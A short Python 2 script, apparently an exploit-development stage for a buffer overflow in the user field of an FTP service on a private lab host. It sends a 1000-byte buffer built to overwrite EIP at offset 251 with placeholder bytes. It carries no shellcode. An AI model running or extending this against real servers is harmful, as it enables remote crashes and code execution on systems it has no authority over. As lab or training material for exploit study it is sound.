#!/usr/bin/env python2

import socket

# overflow is in user field and kicks off at a size of 1000
# OFFSETS
# EIP 251
# EXP 263

RHOST = "10.10.10.2"
RPORT = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_length = 1000
eip_offset = 251

padding = "A" * eip_offset
eip = "BBBB"
filler = "C" * 8
esp = "D" * (buf_length - len(padding) - len(eip) - len(filler))

buf = padding + eip + filler + esp


data = s.recv(1024)
s.send(buf + "\r\n")
data = s.recv(1024)

s.close()

